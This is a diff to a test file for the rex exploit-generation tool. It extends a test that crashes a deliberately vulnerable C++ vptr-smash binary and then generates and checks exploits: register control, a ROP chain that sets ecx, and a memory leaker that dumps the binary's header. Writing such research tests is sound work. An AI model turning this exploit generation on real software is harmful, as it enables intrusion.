@@ -13,7 +13,7 @@ def test_cpp_vptr_smash():
     Test detection of 'arbitrary-read' vulnerability type. (that's it... for now)
     '''
 
-    crash = "A" * 300
+    crash = "A" * 512
     crash = rex.Crash(os.path.join(public_bin_location, "i386/vuln_vptr_smash"), crash)
 
     # this should just tell us that we have an arbitrary-read and that the crash type is explorable
@@ -26,6 +26,64 @@ def test_cpp_vptr_smash():
     # after exploring the crash we should see that it is exploitable
     nose.tools.assert_true(crash.exploitable)
     nose.tools.assert_true(crash.state.se.symbolic(crash.state.regs.pc))
+
+    # let's generate some exploits for it
+    arsenal = crash.exploit()
+
+    # make sure we have control over these
+    nose.tools.assert_true(arsenal.can_control('eax'))
+    nose.tools.assert_true(arsenal.can_control('ebp'))
+    nose.tools.assert_true(arsenal.can_control('ebx'))
+    nose.tools.assert_true(arsenal.can_control('ecx'))
+    nose.tools.assert_true(arsenal.can_control('edi'))
+    nose.tools.assert_true(arsenal.can_control('edx'))
+    nose.tools.assert_true(arsenal.can_control('esi'))
+    nose.tools.assert_true(arsenal.can_control('esp'))
+
+    # make sure we can also generate some leakers, should be rop and shellcode at this point
+    nose.tools.assert_true(len(arsenal.leakers) >= 2)
+
+    # make sure our ecx chain actually works (ecx is chosen arbitrarily)
+    ecx_exploit = arsenal.register_setters['ecx']
+
+    c_str = ecx_exploit._chain.payload_str(constraints=(ecx_exploit._value_var==0x50495a41))
+    c_bvv = ecx_exploit.crash.state.se.BVV(c_str)
+
+    c_mem = ecx_exploit.crash.state.memory.load(ecx_exploit._chain_addr, len(c_str))
+    ecx_exploit.crash.state.add_constraints(c_mem == c_bvv)
+
+    exploited_state = ecx_exploit._windup_state(ecx_exploit.crash.state)
+
+    # make sure there is only one possibility for ecx at this point
+    exploited_ecx_vals = exploited_state.se.any_n_str(exploited_state.regs.ecx, 2)
+    nose.tools.assert_true(len(exploited_ecx_vals) == 1)
+
+    ecx_val = exploited_ecx_vals[0]
+    nose.tools.assert_equal(ecx_val, "PIZA")
+
+    # make sure our leaker exploits writes out the contents
+    leaker_exploit = arsenal.best_type2
+
+    # leak the memory at the binary's base address
+    c_str = leaker_exploit._chain.payload_str(constraints=(leaker_exploit._addr_var==0x8048000))
+    c_bvv = leaker_exploit.crash.state.se.BVV(c_str)
+
+    c_mem = leaker_exploit.crash.state.memory.load(leaker_exploit._chain_addr, len(c_str))
+    leaker_exploit.crash.state.add_constraints(c_mem == c_bvv)
+
+    exploited_state = leaker_exploit._windup_state(leaker_exploit.crash.state, to_syscall=True)
+    exploited_state.add_constraints(exploited_state.regs.eax == 2)
+    exploited_state.add_constraints(exploited_state.regs.ebx == 1)
+    exploited_state.add_constraints(exploited_state.regs.ecx == 0x8048000)
+    exploited_state.add_constraints(exploited_state.regs.edx == 0x1000)
+    exploited_state.add_constraints(exploited_state.regs.esi == 0)
+
+    ss = leaker_exploit._windup_state(exploited_state)
+
+    leaked = ss.posix.dumps(1)
+    leak_start = leaked.find("\x7fCGC")
+    leaked_header = leaked[leak_start:leak_start+0x10]
+    nose.tools.assert_equals(leaked_header, CGC_HEADER)
 
 def test_linux_stacksmash():
     '''
